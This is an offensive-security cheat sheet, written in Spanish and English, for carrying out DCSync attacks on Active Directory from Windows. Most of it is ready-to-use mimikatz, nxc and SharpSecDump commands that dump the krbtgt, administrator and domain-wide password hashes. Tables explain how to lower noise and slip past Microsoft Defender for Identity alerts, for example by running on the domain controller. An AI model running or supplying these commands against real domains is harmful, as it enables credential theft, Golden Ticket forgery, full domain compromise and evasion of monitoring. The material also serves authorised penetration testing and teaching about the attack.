---
aliases:
  - DCSync Windows
  - mimikatz dcsync
  - lsadump dcsync
tags:
  - type/cheatsheet
  - technique/credential-access
  - env/windows
  - asset/active-directory
  - cred/ntlm
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[DCSync]]'
---
# DCSync - Windows Execution

***

## mimikatz lsadump::dcsync

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `lsadump::dcsync /domain:corp.local /user:krbtgt` | krbtgt hash + AES keys | Golden Ticket prep. |
| `lsadump::dcsync /domain:corp.local /user:administrator` | Built-in admin hash | PtH/PtT directo. |
| `lsadump::dcsync /domain:corp.local /user:corp\\svcaccount` | Service account | Targeted. |
| `lsadump::dcsync /domain:corp.local /all /csv` | Full dump en CSV | Masivo — más ruido. |
| `lsadump::dcsync /domain:corp.local /all /csv /dc:dc01.corp.local` | DC específico | Multi-DC env. |
^dcsync-win-mimi

```
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
# Output:
# Object RDN           : krbtgt
# ** SAM ACCOUNT **
# SAM Username         : krbtgt
# Object Security ID   : S-1-5-21-...
# Object Relative ID   : 502
# Credentials:
#   Hash NTLM: <HASH>
#     ntlm- 0: <HASH>
#   Supplemental Credentials:
#     * Kerberos-Newer-Keys
#       Default Salt : CORP.LOCALkrbtgt
#       AES256 : <AESHASH>
#       AES128 : <AESHASH>

mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

___

## mimikatz — sin DA (solo DCSync ACE)

| **Situación** | **Detalle** | **Cuándo** |
|:---:|:---:|:---:|
| User tiene GetChangesAll pero no DA | mimikatz con credenciales del user | Post-ACL-abuse delegation. |
| `lsadump::dcsync /user:krbtgt /domain:corp.local` | Funciona si user tiene los ACEs | Privilege escalation. |
| Error `ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x00002005` | Sin permisos | Need GetChangesAll ACE. |
^dcsync-win-nodaverify

```
:: Run as user con DCSync ACE (no necesita mimikatz privilege::debug)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

___

## nxc desde Windows (proxy)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb DC -u admin -p pass --ntds` | Full dump | Desde Windows con nxc instalado. |
| `nxc smb DC -u admin -p pass --ntds drsuapi` | DCSync method | Explícito. |
^dcsync-win-nxc

___

## SharpSecDump (.NET)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SharpSecDump.exe -target=DC -u=admin -p=pass -d=corp.local` | Full dump | C# alternative en Windows. |
| `SharpSecDump.exe -target=DC -u=admin -p=pass -d=corp.local -just-dc-ntlm` | Solo NT hashes | Compacto. |
^dcsync-win-sharpsec

```powershell
.\SharpSecDump.exe -target=dc01.corp.local -u=administrator -p='P@ssw0rd' -d=corp.local
```

___

## On-DC vs Remote

| **Método** | **Desde** | **Evento en DC** | **MDI** |
|:---:|:---:|:---:|:---:|
| mimikatz `lsadump::dcsync` remoto | Workstation atacante | 4662 (replication GUIDs) | Alert — non-DC source |
| mimikatz `lsadump::dcsync` en el DC | DC comprometido | 4662 self-replication | Potencial blind-spot MDI |
| `lsadump::lsa /patch` en DC | DC local | 4656/4663 (LSASS) | Diferente alert vector |
| ntdsutil IFM en DC | DC local | App log + VSS | No DCSync alert |
^dcsync-win-ondc

**Key:** Ejecutar desde el DC mismo puede evadir el alert específico de "DCSync desde non-DC" de MDI, pero genera otros eventos.

___

## OPSEC comparison

| **Approach** | **Ruido** | **MDI evasion** | **Preferido** |
|:---:|:---:|:---:|:---:|
| `secretsdump -just-dc-user krbtgt` | Mínimo (1 request) | No | Targeted — menos logs |
| `secretsdump -just-dc-ntlm` | Medio | No | Standard |
| `lsadump::dcsync /all /csv` | Alto | No | Evitar si MDI activo |
| ntdsutil IFM en DC | Medio | Sí (no 4662 DCSync) | Si RCE en DC |
| VSS + ntds.dit copy | Medio | Sí | Si RCE en DC |
^dcsync-win-opsec

***
